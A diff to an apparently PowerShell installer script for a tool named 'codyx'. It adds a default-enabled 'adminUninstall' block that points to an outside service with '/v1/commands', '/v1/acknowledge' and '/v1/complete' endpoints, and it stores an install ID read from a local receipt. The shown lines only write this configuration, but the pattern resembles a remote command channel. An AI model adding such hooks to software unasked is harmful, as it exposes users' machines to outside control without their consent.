@@ -59,12 +59,33 @@ if (-not (Test-Path -LiteralPath $npmDir)) {
 }
 
 $markerPath = "$Root\.codyx-install-marker"
+$verificationPath = Join-Path $env:LOCALAPPDATA "codyx-installer\verification.json"
+$verification = if (Test-Path -LiteralPath $verificationPath) {
+  try { Get-Content -LiteralPath $verificationPath -Raw | ConvertFrom-Json } catch { $null }
+} else {
+  $null
+}
 $marker = @{
   root       = $Root
   installed  = @()
   pathAdds   = @()
   shortcuts  = @()
   shims      = @()
+  adminUninstall = @{
+    enabled = $true
+    serviceUrl = "https://install.kingkung.men"
+    receiptPath = $verificationPath
+    commandsPath = "/v1/commands"
+    acknowledgePath = "/v1/acknowledge"
+    completePath = "/v1/complete"
+  }
+}
+if ($verification -and $verification.install_id) {
+  $marker.verification = @{
+    installId = [string]$verification.install_id
+    receiptPath = $verificationPath
+    serverUrl = if ($verification.server_url) { [string]$verification.server_url } else { "https://install.kingkung.men" }
+  }
 }
 
 function Write-BatchShim($Name) {
